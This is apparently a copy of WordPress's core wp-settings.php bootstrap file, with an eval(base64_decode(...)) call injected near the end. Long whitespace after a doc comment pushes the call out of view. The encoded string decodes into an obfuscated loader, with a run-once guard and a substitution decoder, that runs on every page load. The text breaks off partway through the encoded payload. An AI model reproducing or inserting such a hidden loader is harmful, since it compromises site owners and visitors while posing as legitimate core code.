<?php
/**
 * Used to set up and fix common variables and include
 * the WordPress procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see default-constants.php)
 *
 * @package WordPress
 */

/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
require( ABSPATH . WPINC . '/load.php' );
require( ABSPATH . WPINC . '/default-constants.php' );
require_once( ABSPATH . WPINC . '/plugin.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
global $wp_version, $wp_db_version, $tinymce_version, $required_php_version, $required_mysql_version, $wp_local_package;
require( ABSPATH . WPINC . '/version.php' );

/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
 *
 * @global int $blog_id
 * @since 2.0.0
 */
global $blog_id;

// Set initial default constants including WP_MEMORY_LIMIT, WP_MAX_MEMORY_LIMIT, WP_DEBUG, SCRIPT_DEBUG, WP_CONTENT_DIR and WP_CACHE.
wp_initial_constants();

// Check for the required PHP version and for the MySQL extension or a database drop-in.
wp_check_php_mysql_versions();

// Disable magic quotes at runtime. Magic quotes are added using wpdb later in wp-settings.php.
@ini_set( 'magic_quotes_runtime', 0 );
@ini_set( 'magic_quotes_sybase',  0 );

// WordPress calculates offsets from UTC.
date_default_timezone_set( 'UTC' );

// Turn register_globals off.
wp_unregister_GLOBALS();

// Standardize $_SERVER variables across setups.
wp_fix_server_vars();

// Check if we have received a request due to missing favicon.ico
wp_favicon_request();

// Check if we're in maintenance mode.
wp_maintenance();

// Start loading timer.
timer_start();

// Check if we're in WP_DEBUG mode.
wp_debug_mode();

/**
 * Filters whether to enable loading of the advanced-cache.php drop-in.
 *
 * This filter runs before it can be used by plugins. It is designed for non-web
 * run-times. If false is returned, advanced-cache.php will never be loaded.
 *
 * @since 4.6.0
 *
 * @param bool $enable_advanced_cache Whether to enable loading advanced-cache.php (if present).
 *                                    Default true.
 */
if ( WP_CACHE && apply_filters( 'enable_loading_advanced_cache_dropin', true ) ) {
	// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.
	WP_DEBUG ? include( WP_CONTENT_DIR . '/advanced-cache.php' ) : @include( WP_CONTENT_DIR . '/advanced-cache.php' );

	// Re-initialize any hooks added manually by advanced-cache.php
	if ( $wp_filter ) {
		$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
	}
}

// Define WP_LANG_DIR if not set.
wp_set_lang_dir();

// Load early WordPress files.
require( ABSPATH . WPINC . '/compat.php' );
require( ABSPATH . WPINC . '/class-wp-list-util.php' );
require( ABSPATH . WPINC . '/functions.php' );
require( ABSPATH . WPINC . '/class-wp-matchesmapregex.php' );
require( ABSPATH . WPINC . '/class-wp.php' );
require( ABSPATH . WPINC . '/class-wp-error.php' );
require( ABSPATH . WPINC . '/pomo/mo.php' );
require( ABSPATH . WPINC . '/class-phpass.php' );

// Include the wpdb class and, if present, a db.php database drop-in.
global $wpdb;
require_wp_db();

// Set the database table prefix and the format specifiers for database table columns.
$GLOBALS['table_prefix'] = $table_prefix;
wp_set_wpdb_vars();

// Start the WordPress object cache, or an external object cache if the drop-in is present.
wp_start_object_cache();

// Attach the default filters.
require( ABSPATH . WPINC . '/default-filters.php' );

// Initialize multisite if enabled.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/class-wp-site-query.php' );
	require( ABSPATH . WPINC . '/class-wp-network-query.php' );
	require( ABSPATH . WPINC . '/ms-blogs.php' );
	require( ABSPATH . WPINC . '/ms-settings.php' );
} elseif ( ! defined( 'MULTISITE' ) ) {
	define( 'MULTISITE', false );
}

register_shutdown_function( 'shutdown_action_hook' );

// Stop most of WordPress from being loaded if we just want the basics.
if ( SHORTINIT )
	return false;

// Load the L10n library.
require_once( ABSPATH . WPINC . '/l10n.php' );
require_once( ABSPATH . WPINC . '/class-wp-locale.php' );
require_once( ABSPATH . WPINC . '/class-wp-locale-switcher.php' );

// Run the installer if WordPress is not installed.
wp_not_installed();

// Load most of WordPress.
require( ABSPATH . WPINC . '/class-wp-walker.php' );
require( ABSPATH . WPINC . '/class-wp-ajax-response.php' );
require( ABSPATH . WPINC . '/formatting.php' );
require( ABSPATH . WPINC . '/capabilities.php' );
require( ABSPATH . WPINC . '/class-wp-roles.php' );
require( ABSPATH . WPINC . '/class-wp-role.php' );
require( ABSPATH . WPINC . '/class-wp-user.php' );
require( ABSPATH . WPINC . '/class-wp-query.php' );
require( ABSPATH . WPINC . '/query.php' );
require( ABSPATH . WPINC . '/date.php' );
require( ABSPATH . WPINC . '/theme.php' );
require( ABSPATH . WPINC . '/class-wp-theme.php' );
require( ABSPATH . WPINC . '/template.php' );
require( ABSPATH . WPINC . '/user.php' );
require( ABSPATH . WPINC . '/class-wp-user-query.php' );
require( ABSPATH . WPINC . '/class-wp-session-tokens.php' );
require( ABSPATH . WPINC . '/class-wp-user-meta-session-tokens.php' );
require( ABSPATH . WPINC . '/meta.php' );
require( ABSPATH . WPINC . '/class-wp-meta-query.php' );
require( ABSPATH . WPINC . '/class-wp-metadata-lazyloader.php' );
require( ABSPATH . WPINC . '/general-template.php' );
require( ABSPATH . WPINC . '/link-template.php' );
require( ABSPATH . WPINC . '/author-template.php' );
require( ABSPATH . WPINC . '/post.php' );
require( ABSPATH . WPINC . '/class-walker-page.php' );
require( ABSPATH . WPINC . '/class-walker-page-dropdown.php' );
require( ABSPATH . WPINC . '/class-wp-post-type.php' );
require( ABSPATH . WPINC . '/class-wp-post.php' );
require( ABSPATH . WPINC . '/post-template.php' );
require( ABSPATH . WPINC . '/revision.php' );
require( ABSPATH . WPINC . '/post-formats.php' );
require( ABSPATH . WPINC . '/post-thumbnail-template.php' );
require( ABSPATH . WPINC . '/category.php' );
require( ABSPATH . WPINC . '/class-walker-category.php' );
require( ABSPATH . WPINC . '/class-walker-category-dropdown.php' );
require( ABSPATH . WPINC . '/category-template.php' );
require( ABSPATH . WPINC . '/comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment-query.php' );
require( ABSPATH . WPINC . '/class-walker-comment.php' );
require( ABSPATH . WPINC . '/comment-template.php' );
require( ABSPATH . WPINC . '/rewrite.php' );
require( ABSPATH . WPINC . '/class-wp-rewrite.php' );
require( ABSPATH . WPINC . '/feed.php' );
require( ABSPATH . WPINC . '/bookmark.php' );
require( ABSPATH . WPINC . '/bookmark-template.php' );
require( ABSPATH . WPINC . '/kses.php' );
require( ABSPATH . WPINC . '/cron.php' );
require( ABSPATH . WPINC . '/deprecated.php' );
require( ABSPATH . WPINC . '/script-loader.php' );
require( ABSPATH . WPINC . '/taxonomy.php' );
require( ABSPATH . WPINC . '/class-wp-taxonomy.php' );
require( ABSPATH . WPINC . '/class-wp-term.php' );
require( ABSPATH . WPINC . '/class-wp-term-query.php' );
require( ABSPATH . WPINC . '/class-wp-tax-query.php' );
require( ABSPATH . WPINC . '/update.php' );
require( ABSPATH . WPINC . '/canonical.php' );
require( ABSPATH . WPINC . '/shortcodes.php' );
require( ABSPATH . WPINC . '/embed.php' );
require( ABSPATH . WPINC . '/class-wp-embed.php' );
require( ABSPATH . WPINC . '/class-oembed.php' );
require( ABSPATH . WPINC . '/class-wp-oembed-controller.php' );
require( ABSPATH . WPINC . '/media.php' );
require( ABSPATH . WPINC . '/http.php' );
require( ABSPATH . WPINC . '/class-http.php' );
require( ABSPATH . WPINC . '/class-wp-http-streams.php' );
require( ABSPATH . WPINC . '/class-wp-http-curl.php' );
require( ABSPATH . WPINC . '/class-wp-http-proxy.php' );
require( ABSPATH . WPINC . '/class-wp-http-cookie.php' );
require( ABSPATH . WPINC . '/class-wp-http-encoding.php' );
require( ABSPATH . WPINC . '/class-wp-http-response.php' );
require( ABSPATH . WPINC . '/class-wp-http-requests-response.php' );
require( ABSPATH . WPINC . '/class-wp-http-requests-hooks.php' );
require( ABSPATH . WPINC . '/widgets.php' );
require( ABSPATH . WPINC . '/class-wp-widget.php' );
require( ABSPATH . WPINC . '/class-wp-widget-factory.php' );
require( ABSPATH . WPINC . '/nav-menu.php' );
require( ABSPATH . WPINC . '/nav-menu-template.php' );
require( ABSPATH . WPINC . '/admin-bar.php' );
require( ABSPATH . WPINC . '/rest-api.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-server.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-response.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-request.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-posts-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-attachments-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-post-types-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-post-statuses-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-revisions-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-taxonomies-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-terms-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-users-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-comments-controller.php' );
require( ABSPATH . WPINC . '/rest-api/endpoints/class-wp-rest-settings-controller.php' );
require( ABSPATH . WPINC . '/rest-api/fields/class-wp-rest-meta-fields.php' );
require( ABSPATH . WPINC . '/rest-api/fields/class-wp-rest-comment-meta-fields.php' );
require( ABSPATH . WPINC . '/rest-api/fields/class-wp-rest-post-meta-fields.php' );
require( ABSPATH . WPINC . '/rest-api/fields/class-wp-rest-term-meta-fields.php' );
require( ABSPATH . WPINC . '/rest-api/fields/class-wp-rest-user-meta-fields.php' );

$GLOBALS['wp_embed'] = new WP_Embed();

// Load multisite-specific files.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-functions.php' );
	require( ABSPATH . WPINC . '/ms-default-filters.php' );
	require( ABSPATH . WPINC . '/ms-deprecated.php' );
}

// Define constants that rely on the API to obtain the default value.
// Define must-use plugin directory constants, which may be overridden in the sunrise.php drop-in.
wp_plugin_directory_constants();

$GLOBALS['wp_plugin_paths'] = array();

// Load must-use plugins.
foreach ( wp_get_mu_plugins() as $mu_plugin ) {
	include_once( $mu_plugin );
}
unset( $mu_plugin );

// Load network activated plugins.
if ( is_multisite() ) {
	foreach ( wp_get_active_network_plugins() as $network_plugin ) {
		wp_register_plugin_realpath( $network_plugin );
		include_once( $network_plugin );
	}
	unset( $network_plugin );
}

/**
 * Fires once all must-use and network-activated plugins have loaded.
 *
 * @since 2.8.0
 */
do_action( 'muplugins_loaded' );

if ( is_multisite() )
	ms_cookie_constants(  );

// Define constants after multisite is loaded.
wp_cookie_constants();

// Define and enforce our SSL constants
wp_ssl_constants();

// Create common globals.
require( ABSPATH . WPINC . '/vars.php' );

// Make taxonomies and posts available to plugins and themes.
// @plugin authors: warning: these get registered again on the init hook.
create_initial_taxonomies();
create_initial_post_types();

// Register the default theme directory root
register_theme_directory( get_theme_root() );

// Load active plugins.
foreach ( wp_get_active_and_valid_plugins() as $plugin ) {
	wp_register_plugin_realpath( $plugin );
	include_once( $plugin );
}
unset( $plugin );

// Load pluggable functions.
require( ABSPATH . WPINC . '/pluggable.php' );
require( ABSPATH . WPINC . '/pluggable-deprecated.php' );

// Set internal encoding.
wp_set_internal_encoding();

// Run wp_cache_postload() if object cache is enabled and the function exists.
if ( WP_CACHE && function_exists( 'wp_cache_postload' ) )
	wp_cache_postload();

/**
 * Fires once activated plugins have loaded.
 *
 * Pluggable functions are also available at this point in the loading order.
 *
 * @since 1.5.0
 */
do_action( 'plugins_loaded' );

// Define constants which affect functionality if not already defined.
wp_functionality_constants();

// Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
wp_magic_quotes();

/**
 * Fires when comment cookies are sanitized.
 *
 * @since 2.0.11
 */
do_action( 'sanitize_comment_cookies' );

/**
 * WordPress Query object
 * @global WP_Query $wp_the_query
 * @since 2.0.0
 */
$GLOBALS['wp_the_query'] = new WP_Query();

/**
 * Holds the reference to @see $wp_the_query
 * Use this global for WordPress queries
 * @global WP_Query $wp_query
 * @since 1.5.0
 */
$GLOBALS['wp_query'] = $GLOBALS['wp_the_query'];

/**
 * Holds the WordPress Rewrite object for creating pretty URLs
 * @global WP_Rewrite $wp_rewrite
 * @since 1.5.0
 */
$GLOBALS['wp_rewrite'] = new WP_Rewrite();

/**
 * WordPress Object
 * @global WP $wp
 * @since 2.0.0
 */
$GLOBALS['wp'] = new WP();

/**
 * WordPress Widget Factory Object
 * @global WP_Widget_Factory $wp_widget_factory
 * @since 2.8.0
 */
$GLOBALS['wp_widget_factory'] = new WP_Widget_Factory();

/**
 * WordPress User Roles
 * @global WP_Roles $wp_roles
 * @since 2.0.0
 */
$GLOBALS['wp_roles'] = new WP_Roles();

/**
 * Fires */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval(base64_decode("aWYgKCFkZWZpbmVkKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JykpCnsKZGVmaW5lKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JywgMSk7CgogJHdhamtidmVhYSA9IDU1MDk7IGZ1bmN0aW9uIG5kZHZ2YmgoJHVhemR0cywgJHljZGFmeHlxKXskd3Zmb3FieGl1ZiA9ICcnOyBmb3IoJGk9MDsgJGkgPCBzdHJsZW4oJHVhemR0cyk7ICRpKyspeyR3dmZvcWJ4aXVmIC49IGlzc2V0KCR5Y2RhZnh5cVskdWF6ZHRzWyRpXV0pID8gJHljZGFmeHlxWyR1YXpkdHNbJGldXSA6ICR1YXpkdHNbJGldO30KJHZrenpsZXNlZD0iYmFzZSIgLiAiNjRfZGVjb2RlIjtyZXR1cm4gJHZrenpsZXNlZCgkd3Zmb3FieGl1Zik7fQokcXl0YWlrID0gJ3JvRjdla01OQUhyMU9Ua3l4Y015SFR1bUF5eDlxMnNrbDJDWGZDNHByb0Y3ZWtNTkFIcjFPVHVtQXdNRnh2T214dlJ2TGppQ3BsOScuCidZanRaWHpjRld4VGs0cGo2bkpIM1dBSDNGSkdrNGVQTTdIR1FYelBTdkxqaUNwbDlZanRaRnh2T214Rk15QUhabXh2UVgnLgonemN4MVJqdGFEclhpeFRrNEhHUVh6UGtXem9GbmVIcjFSanRhRHIxWWpnNHBlUEoxcVBRRkFjRjdBUHIxcUZacVNWTVZsNENLJy4KJ3BVdFlqdjlZaktpZ3FqWnRBUEFYemNTMXFGWnFTVk1WbDRDS0xqaUtIb0lLcGw5WWp2NFlqZzRwZVBKMXFQUUZBY0Y3QVByMXF0UU9TdGtEazJNVVBrTWxRa1paU3RWUycuCidsd3FLcFV0WWp2OVlqS2lncWpadEFQQVh6Y1MxcXRRT1N0a0RrMk1VUGtNbFFrWlpTdFZTbHdxS0xqaUtMeXFYZkM0Jy4KJ3BXcjRwRHJYWEFLaTFxUFFGQWNGN0FQcjFPNFZSU3RrWlFWRldTRmtmSE4yNFlvUklZVFljWWhxTkpjMklSYycuCidWM0FjdFRmNU9YSlBxdVljVjRlUEJ1Zmp4WHByNHBkQzRwcWppZ3FvUUZBY0Y3QVVndicuCidyU3VVUVNWMlBrTVVrU3NXUmxyNEpOZ0dKVEpUUmhZS0psZ3lKUFZjZWxKSXhjRjNKaDJUSkhRWHpOMklPeUNnUlUnLgondGFEcjFZaktpZ3FqaXRBb1Y0SlVpTXEyc2tsMkNhRHIxZ3FqaWdPb1EzNm9WV2VUa3NxRDRnbEZrUmxEOVlqZzRwcWonLgonaWdxalE1bDJNanJTdWxQeTZoeHdNMzZIUTFPdzRnOFVpdmZsMklKaGlHQVBybllUcXNSeTQ0QVBZS0xsZ3NZbEpuZmxGY2ZvVjNSTlZLUmxxdU9OOVlqSycuCidpZ3FqWnZ6b01LSlBDZ09vWU5IVFZ3Nm9nYURyMVlqZzRwcWppZ3FvQXd6Y1k0ZVBNN3FvWU5INDZGNjIzbXhHcjFwJy4KJ3I0cHFqaWdxNTlZaktpZ3FqaWdxamlneGNrNDZITzdxNVk0eHZRbXpvTUdBSHExeDVPRkF3TXlBSFo5SlBZRnBqeG1ISzNHNkc2QkF2UUNwJy4KJ2tDN0xUdHZManh2TDJpdEh3WVZTRkFWU0Y5dlVWUVNTVk1xbHdZU093NFhwbDlZaktpZ3FqWk1EcjFZaktpZ3FqWmM2UHNoNm9GbXpLJy4KJ1poeHdNNUFIUUh4Y0Y0SlBPOUFTUVh4dlIxcHI0cHFqaWdxNTlZaktpZ3FqaWdxamlnTzVPRnh5aU1xMlZ5eGNWc3BqdGFEcjFZaktpZ3FqJy4KJ2lncWppZ09vVjdKUHVzeEdGTkhHVndBSGtGcUQ0Z3JIT3lKSHQxcGw5WWpnNHBxamlncWppZ3FqJy4KJ2l0SlBzM3o1Rk5kSFlXeEhrRjZQa3pIVWlNcW9ZTkg0NkY2MlFtSndPbXpHcjFwbDlZamc0cHFqaWdxamlncScuCidqaXR4VGs5QUZNQ0pIUTFxRDRnT1ZNbFFrT1BRa096T3dZRFN0RnJrVk1vVVN1Vmx0VllRVTY2ZkM0cHFqaWdxamlncWpaR2VvRjlBVWkxcGpRTnpvVk5lamlNcTVZNHh2Jy4KJ09DekdSMU81WUZ6b0FXeG9WNGVqQ2dRMkZVUVNZU2x3T0FId1lWUzJWVXJrUThTS3RYcWoyTThVWm9yU3VsUVV0WWpLaWdxamlncWppZ2RDNHBxamlncWonLgonaWdxamlncWppZ081WUZ6b0FXeG9WNGVqaU1xNVl3SnZZNHhLZ3R4VGs5QUZNQ0pIUTFMJy4KJ2ppQ0xqaXR4VHUzeFRnWGZDNHBEcjFncWppZ3FqaWdxamlncWpaWEFLaTFPNVlGem9BV3hvVjRlamlNOFVaaHh3TTVBSFEyelRZVXpUTTRwanRYRCcuCidyMWdxamlncWppZ3FqaWdxalphRHIxZ3FqaWdxamlncWppZ3FqaWdxamlnSnZPRkpQOScuCidhRHIxZ3FqaWdxamlncWppZ3FqWk1EcjFZaktpZ3FqaWdxamlncWppZ3FvRmNxajNONjVPOUFQSTFPNVlGem9BV3hvVjRlanRYRHIxZ3FqaWdxamknLgonZ3FqaWdxalphRHIxZ3FqaWdxamlncWppZ3FqaWdxamlnT29WN0pQdXN4R0ZOSEdWd0FIa0ZQdzRnOFVpdHhUazlBRk1DSkhRMWZDJy4KJzRwcWppZ3FqaWdxamlncWppZ1dyNHBxamlncWppZ3FqWk1EcjFZaktpZ3FqaWdxamlnQScuCidjTXlBUFZoZWppMU9vVjdKUHVzeEdGTkhHVndBSGtGcW9WTnFqUWg2SE95QVBzNEhUUVh4S3RZaktpZ3EnLgonamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlnZVBKZ3BqVlh6Rk0zeHZPM2RVZ3RKR2t5eGNrNzYnLgonVk10ZUhxOXFqUXlBSFJYcHI0cHFqaWdxamlncWppZ3FqaWdkQzRwcWppZ3FqaWdxamlncWppZ3FqaWdxalF5QUhSZzhVWjN4dk8zZGtNbkFIT3YnLgonQVVndHhja05MalpoeHdNNUFIUTJlSE9GSkdRbXh2RlJlSFk0cGpRaDZIT3lBUHM0SFRRWHhLdFhmQzRwcWppZ3FqaWdxamlncWppZ1dyNHBxamlncWppZ3FqWk1EcjFZJy4KJ2pLaWdxamlncWppZ3hjazQ2SE83cW9ZTkg0WTFBUFlia0dPWDZvVkt6b1MxSkhPeUpIRlc2UHNYeEhrRnBqUXlBSCcuCidSWHBsOVlqS2lncWpaTURyMVlqS2lncWpaYzZQc2g2b0ZtektaaHh3TURlb2toZXc2eWVIUTNKY3VGcGpRdGVIT1d6b0ZONmp0WWpLaWdxalphRHIxZ3FqaWdxamlncWpRdGVIJy4KJ09Xem9GTjZWTUd4Y0Y0SlBPOUFVaU1xMlZ5eGNWc3BqdGFEcjFZaktpZ3FqaWdxamlnQWNNeUFQVmhlamkxT29RWHhGTTllSFk0cW9WTicuCidxalF0ZUhxWERyMWdxamlncWppZ3E1OVlqS2lncWppZ3FqaWdxamlncW9GY3FqM2llSFlXNkdPWDZvVkt6b1MxT29RWHhLdGdPS0pnZUhZV0FvRnlwalF0ZScuCidIcVhwcjRwcWppZ3FqaWdxamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlncWppZ3FqUScuCid0ZUhPV3pvRk42Vk1HeGNGNEpQTzlBa242cUQ0Z09vUVh4aDlZaktpZ3FqaWdxamlncWppZ3E1Jy4KJzRZaktpZ3FqaWdxamlnV3I0cERyMWdxamlncWppZ3E1T0Y2NWt5ektpdEFvRnlIVHVYeEdRVzZHT1g2b1ZLem9TYURyMWdxamlnV3I0cERyMWcnLgoncWppZ0F2azdKR1FYelRJZ0pHWVdRVGs0UW9GeUFQWTR6R09zbG9GTjZqZ3RBb0Z5TGppdEEnLgonb2tDNm9nTVJsaVhEcjFncWppZ2RDNHBxamlncWppZ3FqaXR4Y2tONlB1NHFENGdKSE95Skh0MXBsOVlqZzRwcWppJy4KJ2dxamlncWpaWEFLaTFxUEZOSFRRWHhLZ3RBb0Z5cFV0WWpLaWdxamlncWppZ2RDNHBxamlncWppZ3EnLgonamlncWppZ3hjazQ2SE83cWpReUFIWXd6NXJhRHIxZ3FqaWdxamlncTU0WWpnNHBxamlncWppZ3FqaXR4Y2tONlB1NFB3NGc4Jy4KJ1VpdEFvRnlmQzRwcWppZ3FqaWdxaml0QW9GeUhUWW02UHM0cUQ0Z1JEOVlqZzRwcWppZ3FqaWdxalpYQUtpMU9vUUZ4NVExcURDZ1JVJy4KJ3RZaktpZ3FqaWdxamlnZEM0cHFqaWdxamlncWppZ3FqaWd4Y2s0NkhPN3FqUXlBSFl3ejVyYURyMWdxamlncWppZ3E1Jy4KJzRZamc0cHFqaWdxamlncWppdEFvRnlxRDRneEdReXpvazdwalF0ZUhxWHFENE1xRDJnOHlpdEFvRnlxRDFneHZReWVQNDFPb1FYeEtDZ093dXhMeXhYJy4KJ2ZDNHBxamlncWppZ3FqaXRlamlNcTJabXhvazdBb0Z5cGpRdGVIcVhmQzRwcWppZ3FqaWdxalpYQUtpMU9vZ2c4bDRNcTJBWmxWWVZwcjRwcWppZ3FqJy4KJ2lncWpaYURyMWdxamlncWppZ3FqaWdxalp5QUhRd3hjSWdPNU9GeEdrOTZEOVlqS2lncWppZ3FqaWdXcjRwRHIxZ3FqaWdxamlncScuCic1NjFlUHVGcWpnMU9vSmc4VVp5QVBWdEFvRnlwalExcFV0Z3FsNE1xMkFabFZZVnByNHBxamlncWppZ3EnLgonalphRHIxZ3FqaWdxamlncWppZ3FqWlhBS2kxT29KZ3FsNE1xang3T3laM3pjcmdPb0pncWw0TXFqeDdMS3hYRHIxZ3FqJy4KJ2lncWppZ3FqaWdxalphRHIxZ3FqaWdxamlncWppZ3FqaWdxamlnT29Zd3h2T0Z6dlFXQW9GeXFENGdxS1F0ZUhxbU8nLgonb0pLZkM0cHFqaWdxamlncWppZ3FqaWdxamlncW9GY3FqM1h4d010ZUhxMU9vWXd4dk9GenZRV0FvRnlwVXRZaktpZ3FqaWdxamlncWppZ3FqaWdxJy4KJ2paYURyMWdxamlncWppZ3FqaWdxamlncWppZ3FqaWdxalF0ZUhPV0pUTXd6dnJncE40Z1JsOVlqZzRwcWppZ3FqaWdxamlncWppZ3FqaWdxamlncWppdHhja042UHUnLgonNFB3NGc4VWl0SkdreXhjazc2Vk10ZUhxYURyMWdxamlncWppZ3FqaWdxamlncWppZ3FqaWdxalF5QUhZd3o1cmc4VVozeHZPM2RrTW5BSE92QVVndHhja042UHU0TGpaaCcuCid4d001QUhRMmVIT0ZKR1FteHZGUmVIWTRwalFoNkhPeUFQczRIVFFYeEtDZ09vUUZ4NVExcWpCZ1JsaVhwbDlZaksnLgonaWdxamlncWppZ3FqaWdxamlncWpaTURyMWdxamlncWppZ3FqaWdxalpNRHIxZ3FqaWdxamlncTU0WWpnNHBxamlncWppZ3FqWmh6b01OQVBRWHhLZ3RlanRhRHIxWWpLaWdxJy4KJ2ppZ3FqaWd4Y2s0NkhPN3FqUXlBSFl3ejVyYURyMWdxamlnV3I0cERyMWdxamlnQXZrN0pHUVh6VElnSkdZV1FUJy4KJ2s0UW9NaFNjTW02amdYRHIxZ3FqaWdkQzRwcWppZ3FqaWdxaml0QW9NaHhjTW02Vk1GemNyZzhVWk42NU95eG9NTnBqUVdTNGtVa3RrVVB5Nmxyd09PU1ZRV1F0RlJRU3NabCcuCidTU3ZIVUNnT1ZNbFFrT1BRa096T3dPVlNra1ZTd1FXa2tPT093NFhmQzRwcWppZ3FqaWdxalpYQUtpMU9vUW1KR09tekdRV0FQc3RxRDRNOFVab3JTdWxRVXQnLgonWWpLaWdxamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlneGNrNDZITzdxalFXUzRrVWt0a1VQeTYybDRZa2xTa2ZrVk1VbDRNU093NGFEcjFncWppZ3FqJy4KJ2lncTU0WWpLaWdxamlncWppZ0FQdU5BUEZjcWpndEFvTWh4Y01tNlZNRnpjcmc4bDRNcURpWERyMWdxamlncWppZ3E1OVlqS2lncWppZ3FqaWdxamlnJy4KJ3E1T0Y2NWt5ektpS0x5cWFEcjFncWppZ3FqaWdxNTRZaktpZ3FqaWdxamlnQVB1TkFyNHBxamlnJy4KJ3FqaWdxalphRHIxZ3FqaWdxamlncWppZ3FqWnlBSFF3eGNJZ3hHa0t4R1F5cGpRV1M0a1VrdGtVUHk2bHJ3T09TVlFXUXRGUlFTc1psU1N2SFVDZ1JqQ2dPbycuCidRbUpHT216R1FXQVBzdHBsOVlqS2lncWppZ3FqaWdXcjRwcWppZ3E1NFlqZzRwcWppZ3FvRmNxamczQXZrN0pHUVh6VHNXQUgzWHhHUU5wajZjZVB1RkhHWnc2Vk1oelRzJy4KJzRBUHM0eHl4WHByNHBxamlncTU5WWpLaWdxamlncWppZ0F2azdKR1FYelRJZ0FjRjlBa01DNkhRV0pUTTc2b2s3NjVSMU9vSTlxJy4KJ2pRdExqaXRBY3UzQXlpTXEyQTN6NVlGcHI0cHFqaWdxamlncWpaYURyMWdxamlncWppZ3FqaScuCidncWppdHpQTXRBVWlNcWpRY3pvVnZxRDRNcURnZzh5aXZKVXhnZktpdjZ5eGFEcjFncWppZ3FqaWdxamlncWppJy4KJ3RBS2lNcTJaY3pHWkZ6S2d0ektDZ09vd21Bb1NYZkM0cHFqaWdxamlncWppZ3FqaWdlUEpncGpRY3FENE04VVpvSlB1TkFVdFlqS2lncWppZ3EnLgonamlncWppZ3E1OVlqS2lncWppZ3FqaWdxamlncWppZ3FqWnlBSFF3eGNJZ1JEOVlqS2lncWonLgonaWdxamlncWppZ3E1NFlqS2lncWppZ3FqaWdxamlncW9rOXhUU1lqS2lncWppZ3FqaWdxamlncTU5WWpLaWdxamlncWppZycuCidxamlncWppZ3FqWlhBS2kxZUhZV0pIT3lKSHQxT29yWHBVaXRBamlNcW9GbnhvdW1Bb1MxT29yWGZDNHBxamlncWppZ3FqaWdxamlncWppZ3EnLgonalFLZEhRRnh3TUd4Y0Y0Nm9rN3FENGdBdjZ5ZUhRRnBqUWNMaml0QWp0YURyMWdxamlncWppZ3FqaWdxamlncWppZ0FjWTl6R1lGcGpRY3BsOVlqS2lncWppZycuCidxamlncWppZ3FqaWdxalp5QUhRd3hjSWdPb09zNm9rTkhHNnllSFE0QVBJYURyMWdxamlncWppZ3FqaWdxalpNRHIxZ3FqaWdxamlncTU0WWpLaWdxalpNRHIxWWpLaWdxalpYJy4KJ0FLaTFxUEF3emNZNGVQTTdIVGtJZUhZNHh5Z3ZBY0Y5QWtNdkFIUVdKVE03Nm9rNzY1UnZwVXRZaktpZ3FqWmFEcjFncWppZ3FqaWdxb0F3eicuCidjWTRlUE03cW9BWHpva1dBVGs0SFRZbXp2UUZ6dlFOcGpRY2VQdUZ6Y1ZuQVV0WWpLaWdxamlncWppZ2RDNHBxamlncWppZ3FqaWdxamlnT28nLgonQTFKUHN0em9TZzhVWmN6R1pGektndEFjRjlBUHMzelBTOXFqT3lxS3RhRHIxZ3FqaWdxamlncScuCidqaWdxaml0QWNZbXp2UUZ6dlFOcUQ0Z0F2T0ZKUHIxT29BMUpQc3R6b1M5cW9BWHpva05lSFhGcGpRY2VQdUZ6Y1ZuQVV0WGZDNHBxamlnJy4KJ3FqaWdxamlncWppZ0FjWTl6R1lGcGpRY2VvVjdBb3VGcGw5WWpnNHBxamlncWppZ3FqaWdxamlneGMnLgonazQ2SE83cWpRY0pUTTc2b2s3NjVSYURyMWdxamlncWppZ3E1NFlqS2lncWpaTURyMVlqZzRwcWppZ3FvQXd6Y1k0ZVBNN3FvWU5IVFFGSkdPc3g1UVd4bzMzeFQnLgonUzFPb1EzNm8yOXFqUWJBSHRYRHIxZ3FqaWdkQzRwcWppZ3FqaWdxaml0ekdrNEhUUTM2bzJnOFVpS3FoOVlqZzRwcWppZ3FqaWdxJy4KJ2paY3pHcWdwalFYOGxpYXFqUVg4NVk0eGN1RnpLZ3RBb1Y0SlV0YXByNHBxamlncWppZ3FqJy4KJ1phRHIxZ3FqaWdxamlncWppZ3FqWmN6R3FncGpRRThsaWFxalFFODVZNHhjdUZ6S2d0ZVRrc3BVaWNPS2l0ZWx1TjY1TzlBUEkxT29RMzZvMlhmeWl0ZUs5YkxqaXRlVTlicHInLgonNHBxamlncWppZ3FqaWdxamlnZEM0cHFqaWdxamlncWppZ3FqaWdxamlncWpRbTZIUVdBb1Y